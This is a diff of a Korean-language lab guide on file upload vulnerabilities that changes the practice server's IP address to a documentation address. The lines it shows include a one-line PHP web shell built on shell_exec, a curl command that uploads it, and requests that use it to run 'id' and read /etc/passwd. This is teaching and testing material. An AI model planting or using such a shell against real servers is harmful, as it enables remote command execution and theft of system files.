@@ -72,7 +72,7 @@ echo "Upload: <a href='/uploads/" . basename($_FILES['file']['name']) . "'>link<
 ### 실습 URL
 
 ```
-http://10.200.101.182/file_upload.php
+http://192.0.2.182/file_upload.php
 ```
 
 ### 테스트 단계
@@ -86,16 +86,16 @@ echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/backdoor.php
 2. 업로드:
 
 ```bash
-curl -F "file=@/tmp/backdoor.php" http://10.200.101.182/file_upload.php
+curl -F "file=@/tmp/backdoor.php" http://192.0.2.182/file_upload.php
 ```
 
 3. 실행 확인:
 
 ```bash
-curl "http://10.200.101.182/uploads/backdoor.php?cmd=id"
+curl "http://192.0.2.182/uploads/backdoor.php?cmd=id"
 # 예상: uid=48(apache) gid=48(apache)
 
-curl "http://10.200.101.182/uploads/backdoor.php?cmd=cat+/etc/passwd"
+curl "http://192.0.2.182/uploads/backdoor.php?cmd=cat+/etc/passwd"
 # 예상: root:x:0:0:root:/root:/bin/bash ...
 ```
 
